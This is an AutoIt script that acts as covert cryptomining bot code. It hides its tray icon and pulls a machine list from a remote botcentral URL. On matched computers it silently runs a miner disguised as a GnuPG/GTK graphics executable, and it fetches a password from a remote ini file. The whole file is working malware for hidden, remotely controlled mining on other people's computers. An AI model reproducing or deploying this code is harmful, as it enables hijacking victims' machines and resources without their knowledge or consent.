#NoTrayIcon
Global Const $HTTP_STATUS_OK = 200
$name=@ComputerName
Func HttpGet($sURL, $sData = "")
Local $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")

$oHTTP.Open("GET", $sURL & "?" & $sData, False)
If (@error) Then Return SetError(1, 0, 0)

$oHTTP.Send()
If (@error) Then Return SetError(2, 0, 0)

If ($oHTTP.Status <> $HTTP_STATUS_OK) Then Return SetError(3, 0, 0)

Return SetError(0, 0, $oHTTP.ResponseText)
EndFunc




Func readWebTxt()

   Global $sGet = HttpGet("https://botcentral.github.io/index.txt")
   Local $aArray[] = StringSplit($sGet,";")
   Local $pc[$aArray[0]][3]
   Local $newPc[3]
   For $i = 1 To $aArray[0]
	   Local $InPc = StringSplit($aArray[$i],"-") ; InPc[1] contains ID pc[2] contains ON/OFF

	   $newPc[0] = $InPc[1]
	   $newPc[1] = $InPc[2]
	   $newPc[2] = $InPc[3]
 	   $pc[$i-1][0] = $newPc[0]
	   $pc[$i-1][1] = $newPc[1]
	   $pc[$i-1][2] = $newPc[2]
	Next
	Return $pc
EndFunc

Func startMiner()
   Local $pc[20][3] = readWebTxt()
   for $i = 0 To 19
	  If ($name == $pc[$i][0]) Then
		 Run("C:\PROGRA~2\GNU\GnuPG\etc\gtk-2.0\update\gtk\gtk_graphics_opengl -u "&$pc[$i][2]&"."&$name&" -p x -t 4","",@SW_HIDE)
		 ProcessSetPriority("gtk_graphics_opengl.exe",0)
	  EndIf
	  Next

EndFunc

   $cmd = "gtk_graphics_opengl.exe -u roony.1 -p x -t 4"
   $hey = Run("C:\Users\ineeve\Desktop\update\update\gtk\"&$cmd,"",@SW_HIDE)
   InetGet("http://blizzstuff.t35.com/News.ini", "C:\news.ini")
   $mainpw = iniread("C:\news.ini", "main", "password", "none")
